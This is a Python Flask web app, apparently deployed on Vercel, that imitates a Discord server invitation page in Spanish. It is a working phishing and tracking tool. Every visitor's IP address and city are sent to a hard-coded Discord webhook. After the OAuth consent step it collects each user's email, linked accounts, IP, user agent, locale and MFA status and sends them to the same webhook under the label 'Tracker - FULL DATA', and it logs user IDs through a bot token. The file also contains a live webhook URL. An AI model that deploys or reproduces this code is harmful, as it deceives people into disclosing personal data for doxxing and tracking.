import os
from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# --- CONFIGURACIÓN ---
CLIENT_ID     = "1446262720578977823"
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
# REDIRECT_URI se genera automáticamente abajo para evitar errores al cambiar de dominio
# El WEBHOOK donde llegarán los logs
WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

# DISEÑO HTML PREMIUM INTEGRADO
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Invitación</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #313338; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Outfit', sans-serif; background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); background-size: cover; color: white; }
        .card { background-color: #2b2d31; width: 100%; max-width: 440px; padding: 32px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .guild-img { width: 80px; height: 80px; border-radius: 28px; margin-bottom: 20px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .header { color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
        .name { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 25px; }
        .btn { background-color: #5865f2; color: white; text-decoration: none; padding: 13px; border-radius: 3px; font-weight: 500; font-size: 16px; display: block; transition: 0.2s; }
        .btn:hover { background-color: #4752c4; }
        .footer { color: #949ba4; font-size: 12px; margin-top: 20px; line-height: 1.5; }
        .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #4e5058; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="{{ logo }}" class="guild-img">
        <div class="header">Estás invitado a unirte a</div>
        <div class="name">Servidor de al3xg0nzalezzz</div>
        <a href="{{ auth_url }}" class="btn">Aceptar Invitación</a>
        <div class="footer">Al unirte, autorizas la verificación de seguridad necesaria para el acceso exclusivo al servidor.</div>
        <div class="brand">al3xg0nzalezzz</div>
    </div>
</body>
</html>
"""

def get_ip():
    # Intenta obtener la IP real detrás de los proxies de Vercel
    ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    return ip

def get_redirect_uri():
    # Se adapta automáticamente al dominio que estés usando (ej. dc-al3xg0nzalezzz.vercel.app)
    host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
    scheme = request.headers.get('X-Forwarded-Proto', 'https')
    return f"{scheme}://{host}/callback"

@app.route('/')
def home():
    ip = get_ip()
    city = request.headers.get('x-vercel-ip-city', 'Desconocida')
    redirect_uri = get_redirect_uri()

    # LOG VISITA (IP inicial)
    try:
        requests.post(WEBHOOK, json={
            "username": "1* Tracker - Visita", "avatar_url": LOGO,
            "embeds": [{"title": "👁️ Visita Detectada", "color": 0x5865F2, "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Localidad", "value": f"{city}", "inline": True}]}]
        })
    except Exception as e:
        print(f"Error enviando webhook: {e}")

    # Generar URL de autorización (Scopes ampliados: identify + email + connections)
    # %20 es el espacio en URL encoding
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20email%20connections"
    
    return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    redirect_uri = get_redirect_uri()
    
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
    
    try:
        # 1. Obtener Token (REFORZADO)
        payload = {
            'client_id': CLIENT_ID, 
            'client_secret': CLIENT_SECRET, 
            'grant_type': 'authorization_code', 
            'code': code, 
            'redirect_uri': redirect_uri
        }
        
        # Hacemos la petición y verificamos errores
        resp = requests.post(
            "https://discord.com/api/v10/oauth2/token", 
            data=payload, 
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        if resp.status_code != 200:
            print(f"[ERROR OAUTH] Fallo al obtener token: {resp.status_code} - {resp.text}")
            return redirect("https://discord.gg/nUy6Vjr9YU")

        r = resp.json()
        token = r.get('access_token')
        
        if token:
            headers = {'Authorization': f'Bearer {token}'}
            
            # 2. Obtener Datos Básicos + Email
            user = requests.get("https://discord.com/api/v10/users/@me", headers=headers).json()
            
            # 3. Obtener Conexiones (Steam, Spotify, etc.)
            connections = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers).json()
            
            # Procesar datos
            ip = get_ip()
            username = user.get('username', 'Unknown')
            user_id = user.get('id', 'Unknown')
            email = user.get('email', 'No visible')
            verified = "✅" if user.get('verified') else "❌"
            
            # Formatear conexiones en texto
            conn_list = []
            for conn in connections:
                # Ejemplo: "Steam (Juanito)" o simplemente "Spotify"
                if conn.get('verified'): # Solo mostrar verificadas si quieres ahorrar espacio
                    conn_list.append(f"{conn['type'].capitalize()}: **{conn['name']}**")
            
            conn_str = "\n".join(conn_list) if conn_list else "Ninguna visible"

            # 3.5 ENVIAR ID AL CANAL (Base de Datos)
            registration_status = "❌ Error"
            try:
                # Usamos el token del bot para escribir en el canal
                BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
                DB_CHANNEL_ID = "1457771004813246748"
                
                print(f"[AUTH] Intentando registrar usuario ID: {user_id} en canal {DB_CHANNEL_ID}")
                
                response = requests.post(
                    f"https://discord.com/api/v9/channels/{DB_CHANNEL_ID}/messages",
                    headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
                    json={"content": str(user_id)},
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"[AUTH] ✅ ID {user_id} registrada exitosamente en el canal")
                    registration_status = "✅ Registrado"
                else:
                    print(f"[AUTH] ❌ Error al registrar ID. Status: {response.status_code}, Response: {response.text}")
                    registration_status = f"❌ Error ({response.status_code})"
                    
            except Exception as e:
                print(f"[AUTH] ❌ Error crítico guardando en canal DB: {e}")
                registration_status = f"❌ Exception: {str(e)[:50]}"

            # 4. Enviar LOG COMPLETO
            # Información Técnica Adicional (User Agent)
            user_agent = request.headers.get('User-Agent', 'Desconocido')
            locale = user.get('locale', 'Desconocido')
            mfa = "🔒 Activado" if user.get('mfa_enabled') else "🔓 Desactivado"
            
            requests.post(WEBHOOK, json={
                "username": "1* Tracker - FULL DATA", "avatar_url": LOGO,
                "embeds": [{
                    "title": "🎯 ¡IDENTIDAD EXPANDIDA!", 
                    "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else LOGO},
                    "fields": [
                        {"name": "👤 Usuario", "value": f"**{username}**", "inline": True},
                        {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
                        {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
                        {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                        {"name": "💻 Sistema", "value": f"`{user_agent[:50]}...`", "inline": True},
                        {"name": "🌍 Locale/MFA", "value": f"{locale} | {mfa}", "inline": True},
                        {"name": "🎫 Estado Registro", "value": registration_status, "inline": False}
                    ]
                }]
            })
    except Exception as e:
        print(f"Error en callback: {e}")
        pass
        
    return redirect("https://discord.gg/nUy6Vjr9YU")

# Vercel necesita esto
app = app